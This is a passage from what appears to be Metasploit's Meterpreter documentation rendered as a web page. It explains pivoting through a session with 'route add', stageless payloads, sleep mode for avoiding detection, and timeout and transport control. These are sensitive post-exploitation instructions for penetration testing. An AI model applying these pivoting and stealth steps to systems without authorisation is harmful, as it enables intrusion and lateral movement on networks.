class=\"language-text\">meterpreter &gt; ipconfig</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Make sure you know the subnet, netmask, and the Meterpreter/session ID. Return to the msf prompt,\nand establish that route:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; route add 192.168.1.0 255.255.255.0 1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>At that point, you should have a working pivot. You can use other Metasploit modules to explore\nor exploit more hosts on the network, or use auxiliary/server/socks4a and <a href=\"http://proxychains.sourceforge.net/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Proxychains</a> to allow\nother third-party tools to do the same.</p>\n<h2 id=\"meterpreter-stageless-mode\" style=\"position:relative;\"><a href=\"#meterpreter-stageless-mode\" aria-label=\"meterpreter stageless mode permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Meterpreter Stageless Mode</h2>\n<p>A stageless Meterpreter allows a more economical way to deliver the payload, for cases where a\nnormal one would actually cost too much time and bandwidth in a penetration test. To learn more\nabout this, <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Stageless-Mode\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">click on this</a>\nto read more.</p>\n<p>To use the stageless payload, use <code class=\"language-text\">windows/meterpreter_reverse_https</code> instead.</p>\n<h2 id=\"meterpreter-sleep-control\" style=\"position:relative;\"><a href=\"#meterpreter-sleep-control\" aria-label=\"meterpreter sleep control permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Meterpreter Sleep Control</h2>\n<p>The sleep mode allows the payload on the target machine to be quiet for awhile, mainly in order to\navoid suspicious active communication. It also provides better efficiency.</p>\n<p>It is very simple to use. At the Meterpreter prompt, simply do:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; sleep 20</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>And that will allow Meterpreter to sleep 20 seconds, and will reconnect as long as the handler\nremains active (such as running as a background job).</p>\n<p>To learn more about this feature, please <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Sleep-Control\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">click here</a>.</p>\n<h2 id=\"meterpreter-timeout-control\" style=\"position:relative;\"><a href=\"#meterpreter-timeout-control\" aria-label=\"meterpreter timeout control permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Meterpreter Timeout Control</h2>\n<p>The timeout control basically defines the life span of Meterpreter. To configure it, use the\n<code class=\"language-text\">set_timeouts</code> command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; set_timeouts \nUsage: set_timeouts [options]\n\nSet the current timeout options.\nAny or all of these can be set at once.\n\nOPTIONS:\n\n    -c &lt;opt&gt;  Comms timeout (seconds)\n    -h        Help menu\n    -t &lt;opt&gt;  Retry total time (seconds)\n    -w &lt;opt&gt;  Retry wait time (seconds)\n    -x &lt;opt&gt;  Expiration timout (seconds)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>To see the current timeout configuration, you can use the <code class=\"language-text\">get_timeouts</code> command:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">meterpreter &gt; get_timeouts\nSession Expiry  : @ 2016-03-11 21:15:58\nComm Timeout    : 300 seconds\nRetry Total Time: 3600 seconds\nRetry Wait Time : 10 seconds</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>To learn more about timeout control, please <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">go here</a>.</p>\n<h2 id=\"meterpreter-transport-control\" style=\"position:relative;\"><a href=\"#meterpreter-transport-control\" aria-label=\"meterpreter transport control permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Meterpreter Transport Control</h2>\n<p>Transport Control allows you manage transports on the fly while the payload session is still\nrunning. Meterpreter can automatically cycle through the transports when communication fails,\nor you can do it manually.</p>\n<p>To learn more about this, please read this <a href=\"https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">documentation</a>.</p>"}}},"pageContext":{"id":"68d3eb1a-3665-5b4f-bc5b-749de46770b6"}}}